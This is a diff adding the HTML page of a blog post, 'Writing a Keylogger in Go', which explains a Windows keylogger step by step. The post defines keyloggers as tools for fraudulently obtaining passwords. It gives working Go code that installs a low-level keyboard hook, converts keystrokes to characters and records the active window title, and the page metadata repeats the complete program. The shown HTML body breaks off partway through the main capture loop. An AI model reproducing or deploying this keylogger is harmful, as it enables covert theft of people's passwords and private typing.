@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Writing a Keylogger in Go | The Sico blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="What is a Keylogger a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.
+Code Explanation: Imports: import ( &#34;fmt&#34; &#34;os&#34; &#34;os/signal&#34; &#34;syscall&#34; &#34;unsafe&#34; &#34;github.com/moutend/go-hook/pkg/keyboard&#34; &#34;github.com/moutend/go-hook/pkg/types&#34; &#34;golang.org/x/sys/windows&#34; ) The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows
+go-hook is package by github user moutend that allows you to directly interface with low level windows keyboard hooks.">
+<meta name="author" content="">
+<link rel="canonical" href="https://xart3mis.github.io/posts/keylogger/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.abc7c82c3d415a6df50430738d1cbcc4c76fea558bc5a0c830d3babf78167a35.css" integrity="sha256-q8fILD1BWm31BDBzjRy8xMdv6lWLxaDIMNO6v3gWejU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://xart3mis.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://xart3mis.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://xart3mis.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://xart3mis.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://xart3mis.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Writing a Keylogger in Go" />
+<meta property="og:description" content="What is a Keylogger a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.
+Code Explanation: Imports: import ( &#34;fmt&#34; &#34;os&#34; &#34;os/signal&#34; &#34;syscall&#34; &#34;unsafe&#34; &#34;github.com/moutend/go-hook/pkg/keyboard&#34; &#34;github.com/moutend/go-hook/pkg/types&#34; &#34;golang.org/x/sys/windows&#34; ) The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows
+go-hook is package by github user moutend that allows you to directly interface with low level windows keyboard hooks." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xart3mis.github.io/posts/keylogger/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-16T20:30:23+02:00" />
+<meta property="article:modified_time" content="2022-10-16T20:30:23+02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Writing a Keylogger in Go"/>
+<meta name="twitter:description" content="What is a Keylogger a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.
+Code Explanation: Imports: import ( &#34;fmt&#34; &#34;os&#34; &#34;os/signal&#34; &#34;syscall&#34; &#34;unsafe&#34; &#34;github.com/moutend/go-hook/pkg/keyboard&#34; &#34;github.com/moutend/go-hook/pkg/types&#34; &#34;golang.org/x/sys/windows&#34; ) The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows
+go-hook is package by github user moutend that allows you to directly interface with low level windows keyboard hooks."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Writing a Keylogger in Go",
+      "item": "https://xart3mis.github.io/posts/keylogger/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Writing a Keylogger in Go",
+  "name": "Writing a Keylogger in Go",
+  "description": "What is a Keylogger a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.\nCode Explanation: Imports: import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/signal\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;github.com/moutend/go-hook/pkg/keyboard\u0026#34; \u0026#34;github.com/moutend/go-hook/pkg/types\u0026#34; \u0026#34;golang.org/x/sys/windows\u0026#34; ) The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows\ngo-hook is package by github user moutend that allows you to directly interface with low level windows keyboard hooks.",
+  "keywords": [
+    
+  ],
+  "articleBody": "What is a Keylogger a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.\nCode Explanation: Imports: import ( \"fmt\" \"os\" \"os/signal\" \"syscall\" \"unsafe\" \"github.com/moutend/go-hook/pkg/keyboard\" \"github.com/moutend/go-hook/pkg/types\" \"golang.org/x/sys/windows\" ) The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows\ngo-hook is package by github user moutend that allows you to directly interface with low level windows keyboard hooks. Package windows and syscall contain an interface to the low-level operating system primitives.\nVariables:   mod: store the loaded user32.dll library\nmod = windows.NewLazyDLL(\"user32.dll\")   procGetKeyState: store the function GetKeyState from user32.dll. This function gets the state of the specified key (is the specified key pressed or not)\nprocGetKeyState = mod.NewProc(\"GetKeyState\")   procGetKeyboardLayout: store the function GetKeyboardLayout from user32.dll. This function gets the layout of the current keyboard\nprocGetKeyboardLayout = mod.NewProc(\"GetKeyboardLayout\")   procGetKeyboardState: store the function GetKeyboardState from user32.dll. This function gets the state of the entire keyboard (which keys are pressed)\nprocGetKeyboardState = mod.NewProc(\"GetKeyboardState\")   procGetForegroundWindow: store the function GetForegroundWindow from user32.dll. This function gets the current foreground window\nprocGetForegroundWindow = mod.NewProc(\"GetForegroundWindow\")   procToUnicodeEx: store the function ToUnicodeEx from user32.dll. This function converts scancodes returned by our keyboard hook to unicode\nprocToUnicodeEx = mod.NewProc(\"ToUnicodeEx\")   procGetWindowText: store the function GetWindowText from user32.dll. This function gets the text of the window specified\nprocGetWindowText = mod.NewProc(\"GetWindowTextW\")   procGetWindowTextLength: store the function GetWindowTextLength from user32.dll. This function gets the length of the text of a specified window\nprocGetWindowTextLength = mod.NewProc(\"GetWindowTextLengthW\")   var ( mod = windows.NewLazyDLL(\"user32.dll\") procGetKeyState = mod.NewProc(\"GetKeyState\") procGetKeyboardLayout = mod.NewProc(\"GetKeyboardLayout\") procGetKeyboardState = mod.NewProc(\"GetKeyboardState\") procGetForegroundWindow = mod.NewProc(\"GetForegroundWindow\") procToUnicodeEx = mod.NewProc(\"ToUnicodeEx\") procGetWindowText = mod.NewProc(\"GetWindowTextW\") procGetWindowTextLength = mod.NewProc(\"GetWindowTextLengthW\") ) Types:  HANDLE: uintptr type for HWND. HWND: HANDLE type for storing window hwnd.  type ( HANDLE uintptr HWND HANDLE ) Functions: func GetWindowTextLength(hwnd HWND) int { ret, _, _ := procGetWindowTextLength.Call( uintptr(hwnd)) return int(ret) } GetWindowTextLength is a function that takes the HWND of the window and returns the length of the window text.\nfunc GetWindowText(hwnd HWND) string { textLen := GetWindowTextLength(hwnd) + 1 buf := make([]uint16, textLen) procGetWindowText.Call( uintptr(hwnd), uintptr(unsafe.Pointer(\u0026buf[0])), uintptr(textLen)) return syscall.UTF16ToString(buf) } GetWindowText is a function that takes the HWND of the window and returns the windows’ text by storing it in a buffer then converting it to a string.\nfunc GetForegroundWindow() uintptr { hwnd, _, _ := procGetForegroundWindow.Call() return hwnd } GetForegroundWindow is a function that returns the currently focused window.\nfunc Run(key_out chan rune, window_out chan string) error { // Buffer size is depends on your need. The 100 is placeholder value. \tkeyboardChan := make(chan types.KeyboardEvent, 1024) if err := keyboard.Install(nil, keyboardChan); err != nil { return err } defer keyboard.Uninstall() signalChan := make(chan os.Signal, 1) signal.Notify(signalChan, os.Interrupt) fmt.Println(\"start capturing keyboard input\") for { select { case signalChan: fmt.Println(\"Received shutdown signal\") return nil case k := keyboardChan: if hwnd := GetForegroundWindow(); hwnd != 0 { if k.Message == types.WM_KEYDOWN { key_out  VKCodeToAscii(k) window_out  GetWindowText(HWND(hwnd)) } } } } } Function Run() runs the keylogger.\nHow it works: First initialize a buffered channel to store keyboard events then install the low level keyboard hook using keyboard.Install().\ndefer uninstallation of the hook so that it gets uninstalled when the function returns. Then in an infinite for loop get the foreground window using GetForegroundWindow() and when a key is pressed send the key to the key_out channel and the window name to window_out channel.\nfunc VKCodeToAscii(k types.KeyboardEvent) rune { var buffer []uint16 = make([]uint16, 256) var keyState []byte = make([]byte, 256) n := 10 n |= (1  2) procGetKeyState.Call(uintptr(k.VKCode)) procGetKeyboardState.Call(uintptr(unsafe.Pointer(\u0026keyState[0]))) r1, _, _ := procGetKeyboardLayout.Call(0) procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(\u0026keyState[0])), uintptr(unsafe.Pointer(\u0026buffer[0])), 256, uintptr(n), r1) if len(syscall.UTF16ToString(buffer))  0 { return []rune(syscall.UTF16ToString(buffer))[0] } return rune(0) } Function VKCodeToAscii converts from Virtual-Key Code to ASCII\nHow it works First initialize two buffers one for storing the result and one for storing the keyboard state, Then get the key state of the pressed key because that’s the only way the rest of the function will work trust me try removing that line and it’ll return innacurate results. After that get the keyboard state and store it in the buffer we created, Then Call ToUnicodeEx to convert from VKCode to unicode. Then return the result if the length of the result buffer is larger than 0.\nFinal Code: package main import ( \"fmt\" \"os\" \"os/signal\" \"syscall\" \"unsafe\" \"github.com/moutend/go-hook/pkg/keyboard\" \"github.com/moutend/go-hook/pkg/types\" \"golang.org/x/sys/windows\" ) var ( mod = windows.NewLazyDLL(\"user32.dll\") procGetKeyState = mod.NewProc(\"GetKeyState\") procGetKeyboardLayout = mod.NewProc(\"GetKeyboardLayout\") procGetKeyboardState = mod.NewProc(\"GetKeyboardState\") procGetForegroundWindow = mod.NewProc(\"GetForegroundWindow\") procToUnicodeEx = mod.NewProc(\"ToUnicodeEx\") procGetWindowText = mod.NewProc(\"GetWindowTextW\") procGetWindowTextLength = mod.NewProc(\"GetWindowTextLengthW\") ) type ( HANDLE uintptr HWND HANDLE ) // Gets length of text of window text by HWND func GetWindowTextLength(hwnd HWND) int { ret, _, _ := procGetWindowTextLength.Call( uintptr(hwnd)) return int(ret) } // Gets text of window text by HWND func GetWindowText(hwnd HWND) string { textLen := GetWindowTextLength(hwnd) + 1 buf := make([]uint16, textLen) procGetWindowText.Call( uintptr(hwnd), uintptr(unsafe.Pointer(\u0026buf[0])), uintptr(textLen)) return syscall.UTF16ToString(buf) } // Gets current foreground window func GetForegroundWindow() uintptr { hwnd, _, _ := procGetForegroundWindow.Call() return hwnd } // Runs the keylogger func Run(key_out chan rune, window_out chan string) error { keyboardChan := make(chan types.KeyboardEvent, 1024) if err := keyboard.Install(nil, keyboardChan); err != nil { return err } defer keyboard.Uninstall() signalChan := make(chan os.Signal, 1) signal.Notify(signalChan, os.Interrupt) fmt.Println(\"start capturing keyboard input\") for { select { case signalChan: fmt.Println(\"Received shutdown signal\") return nil case k := keyboardChan: if hwnd := GetForegroundWindow(); hwnd != 0 { if k.Message == types.WM_KEYDOWN { key_out  VKCodeToAscii(k) window_out  GetWindowText(HWND(hwnd)) } } } } } // Converts from Virtual-Keycode to Ascii rune func VKCodeToAscii(k types.KeyboardEvent) rune { var buffer []uint16 = make([]uint16, 256) var keyState []byte = make([]byte, 256) n := 10 n |= (1  2) procGetKeyState.Call(uintptr(k.VKCode)) procGetKeyboardState.Call(uintptr(unsafe.Pointer(\u0026keyState[0]))) r1, _, _ := procGetKeyboardLayout.Call(0) procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(\u0026keyState[0])), uintptr(unsafe.Pointer(\u0026buffer[0])), 256, uintptr(n), r1) if len(syscall.UTF16ToString(buffer))  0 { return []rune(syscall.UTF16ToString(buffer))[0] } return rune(0) } ",
+  "wordCount" : "964",
+  "inLanguage": "en",
+  "datePublished": "2022-10-16T20:30:23+02:00",
+  "dateModified": "2022-10-16T20:30:23+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://xart3mis.github.io/posts/keylogger/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "The Sico blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://xart3mis.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://xart3mis.github.io/" accesskey="h" title="The Sico blog (Alt + H)">The Sico blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Writing a Keylogger in Go
+    </h1>
+    <div class="post-meta"><span title='2022-10-16 20:30:23 +0200 EET'>October 16, 2022</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h3 id="what-is-a-keylogger">What is a Keylogger<a hidden class="anchor" aria-hidden="true" href="#what-is-a-keylogger">#</a></h3>
+<p>a computer program that records every keystroke made by a computer user, especially in order to gain fraudulent access to passwords and other confidential information.</p>
+<h2 id="code-explanation">Code Explanation:<a hidden class="anchor" aria-hidden="true" href="#code-explanation">#</a></h2>
+<h3 id="imports">Imports:<a hidden class="anchor" aria-hidden="true" href="#imports">#</a></h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	<span style="color:#e6db74">&#34;os&#34;</span>
+	<span style="color:#e6db74">&#34;os/signal&#34;</span>
+
+	<span style="color:#e6db74">&#34;syscall&#34;</span>
+	<span style="color:#e6db74">&#34;unsafe&#34;</span>
+
+	<span style="color:#e6db74">&#34;github.com/moutend/go-hook/pkg/keyboard&#34;</span>
+	<span style="color:#e6db74">&#34;github.com/moutend/go-hook/pkg/types&#34;</span>
+	<span style="color:#e6db74">&#34;golang.org/x/sys/windows&#34;</span>
+)
+</code></pre></div><p>The 4 most important imported modules are syscall, github.com/moutend/go-hook/pkg/keyboard, github.com/moutend/go-hook/pkg/types, and golang.org/x/sys/windows</p>
+<p><a href="https://github.com/moutend/go-hook/">go-hook</a> is package by github user moutend that allows you to directly interface with low level windows keyboard hooks.
+Package windows and syscall contain an interface to the low-level operating system primitives.</p>
+<h3 id="variables">Variables:<a hidden class="anchor" aria-hidden="true" href="#variables">#</a></h3>
+<ul>
+<li>
+<p>mod: store the loaded <em>user32.dll</em> library</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">mod</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NewLazyDLL</span>(<span style="color:#e6db74">&#34;user32.dll&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procGetKeyState: store the function GetKeyState from <em>user32.dll</em>. This function gets the state of the specified key (is the specified key pressed or not)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procGetKeyState</span>         = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyState&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procGetKeyboardLayout: store the function GetKeyboardLayout from <em>user32.dll</em>. This function gets the layout of the current keyboard</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procGetKeyboardLayout</span>   = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyboardLayout&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procGetKeyboardState: store the function GetKeyboardState from <em>user32.dll</em>. This function gets the state of the entire keyboard (which keys are pressed)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procGetKeyboardState</span>    = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyboardState&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procGetForegroundWindow: store the function GetForegroundWindow from <em>user32.dll</em>. This function gets the current foreground window</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procGetForegroundWindow</span> = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetForegroundWindow&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procToUnicodeEx: store the function ToUnicodeEx from <em>user32.dll</em>. This function converts scancodes returned by our keyboard hook to unicode</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procToUnicodeEx</span>         = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;ToUnicodeEx&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procGetWindowText: store the function GetWindowText from <em>user32.dll</em>. This function gets the text of the window specified</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procGetWindowText</span>       = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetWindowTextW&#34;</span>)
+</code></pre></div></li>
+<li>
+<p>procGetWindowTextLength: store the function GetWindowTextLength from <em>user32.dll</em>. This function gets the length of the text of a specified window</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">procGetWindowTextLength</span> = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetWindowTextLengthW&#34;</span>)
+</code></pre></div></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">var</span> (
+	<span style="color:#a6e22e">mod</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NewLazyDLL</span>(<span style="color:#e6db74">&#34;user32.dll&#34;</span>)
+
+	<span style="color:#a6e22e">procGetKeyState</span>         = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyState&#34;</span>)
+	<span style="color:#a6e22e">procGetKeyboardLayout</span>   = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyboardLayout&#34;</span>)
+	<span style="color:#a6e22e">procGetKeyboardState</span>    = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyboardState&#34;</span>)
+	<span style="color:#a6e22e">procGetForegroundWindow</span> = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetForegroundWindow&#34;</span>)
+	<span style="color:#a6e22e">procToUnicodeEx</span>         = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;ToUnicodeEx&#34;</span>)
+	<span style="color:#a6e22e">procGetWindowText</span>       = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetWindowTextW&#34;</span>)
+	<span style="color:#a6e22e">procGetWindowTextLength</span> = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetWindowTextLengthW&#34;</span>)
+)
+</code></pre></div><h3 id="types">Types:<a hidden class="anchor" aria-hidden="true" href="#types">#</a></h3>
+<ul>
+<li>HANDLE: uintptr type for HWND.</li>
+<li>HWND: HANDLE type for storing window hwnd.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">type</span> (
+	<span style="color:#a6e22e">HANDLE</span> <span style="color:#66d9ef">uintptr</span>
+	<span style="color:#a6e22e">HWND</span>   <span style="color:#a6e22e">HANDLE</span>
+)
+</code></pre></div><h3 id="functions">Functions:<a hidden class="anchor" aria-hidden="true" href="#functions">#</a></h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetWindowTextLength</span>(<span style="color:#a6e22e">hwnd</span> <span style="color:#a6e22e">HWND</span>) <span style="color:#66d9ef">int</span> {
+	<span style="color:#a6e22e">ret</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">procGetWindowTextLength</span>.<span style="color:#a6e22e">Call</span>(
+		uintptr(<span style="color:#a6e22e">hwnd</span>))
+
+	<span style="color:#66d9ef">return</span> int(<span style="color:#a6e22e">ret</span>)
+}
+</code></pre></div><p>GetWindowTextLength is a function that takes the HWND of the window and returns the length of the window text.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetWindowText</span>(<span style="color:#a6e22e">hwnd</span> <span style="color:#a6e22e">HWND</span>) <span style="color:#66d9ef">string</span> {
+	<span style="color:#a6e22e">textLen</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GetWindowTextLength</span>(<span style="color:#a6e22e">hwnd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+	<span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">uint16</span>, <span style="color:#a6e22e">textLen</span>)
+	<span style="color:#a6e22e">procGetWindowText</span>.<span style="color:#a6e22e">Call</span>(
+		uintptr(<span style="color:#a6e22e">hwnd</span>),
+		uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">buf</span>[<span style="color:#ae81ff">0</span>])),
+		uintptr(<span style="color:#a6e22e">textLen</span>))
+
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">UTF16ToString</span>(<span style="color:#a6e22e">buf</span>)
+}
+
+</code></pre></div><p>GetWindowText is a function that takes the HWND of the window and returns the windows&rsquo; text by storing it in a buffer then converting it to a string.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetForegroundWindow</span>() <span style="color:#66d9ef">uintptr</span> {
+	<span style="color:#a6e22e">hwnd</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">procGetForegroundWindow</span>.<span style="color:#a6e22e">Call</span>()
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hwnd</span>
+}
+</code></pre></div><p>GetForegroundWindow is a function that returns the currently focused window.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Run</span>(<span style="color:#a6e22e">key_out</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">rune</span>, <span style="color:#a6e22e">window_out</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">error</span> {
+	<span style="color:#75715e">// Buffer size is depends on your need. The 100 is placeholder value.
+</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">keyboardChan</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">types</span>.<span style="color:#a6e22e">KeyboardEvent</span>, <span style="color:#ae81ff">1024</span>)
+
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">keyboard</span>.<span style="color:#a6e22e">Install</span>(<span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">keyboardChan</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+	}
+
+	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">keyboard</span>.<span style="color:#a6e22e">Uninstall</span>()
+
+	<span style="color:#a6e22e">signalChan</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Signal</span>, <span style="color:#ae81ff">1</span>)
+	<span style="color:#a6e22e">signal</span>.<span style="color:#a6e22e">Notify</span>(<span style="color:#a6e22e">signalChan</span>, <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Interrupt</span>)
+
+	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;start capturing keyboard input&#34;</span>)
+
+	<span style="color:#66d9ef">for</span> {
+		<span style="color:#66d9ef">select</span> {
+		<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">signalChan</span>:
+			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Received shutdown signal&#34;</span>)
+			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">keyboardChan</span>:
